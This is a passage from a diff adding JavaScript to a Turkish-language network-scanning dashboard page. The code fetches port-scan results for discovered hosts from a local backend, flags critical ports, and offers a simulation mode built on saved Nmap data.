+      const devIdx = devices.findIndex(d => d.label === h.ip);
+      if (devIdx === -1) return;
+      try {
+        const resp = await fetch(`${SERVER}/scan/ports/${h.ip}`, { signal: AbortSignal.timeout(30000) });
+        const pd = await resp.json();
+        if (pd.success && devices[devIdx]) {
+          devices[devIdx].ports = pd.ports && pd.ports.length > 0
+            ? pd.ports.map(p => `${p.port}/${p.protocol} — ${p.service}${p.risk === 'KRITIK' ? ' 🔴' : ''}`)
+            : ['Açık port yok'];
+          devices[devIdx].os = pd.os_guess || 'Bilinmiyor';
+          const hasCritical = pd.ports && pd.ports.some(p => p.risk === 'KRITIK');
+          devices[devIdx].risk = hasCritical ? 'KRİTİK' : 'NORMAL';
+          if (hasCritical) devices[devIdx].color = '#ff4757';
+          log(`${h.ip} → ${pd.port_count || 0} port tarandı`, '#00ff88');
+        }
+      } catch(e) {
+        if (devices[devIdx]) devices[devIdx].ports = ['Port tarama zaman aşımı'];
+      }
+    });
+  }
+
+  function useMockData() {
+    // Mock verileri geri yükle
+    devices.length = 0;
+    mockDevices.forEach(d => devices.push(JSON.parse(JSON.stringify(d))));
+    links.length = 0;
+    mockLinks.forEach(l => links.push(l));
+    packets.length = 0;
+    selectedDevice = null;
+    document.getElementById('devicePanel').style.display = 'none';
+    resizeCanvas();
+    document.getElementById('serverDot').style.background = 'var(--cyan)';
+    document.getElementById('serverStatus').style.color = 'var(--cyan)';
+    document.getElementById('serverStatus').textContent = 'Simülasyon modu';
+    log('Simülasyon modu aktif — önceden kaydedilmiş Nmap verileri kullanılıyor.', '#00d4ff');
+  }
+
+  // Sayfa açılınca sunucuyu kontrol et
+  setTimeout(checkServer, 1000);
+</script>
+</body>
+</html>
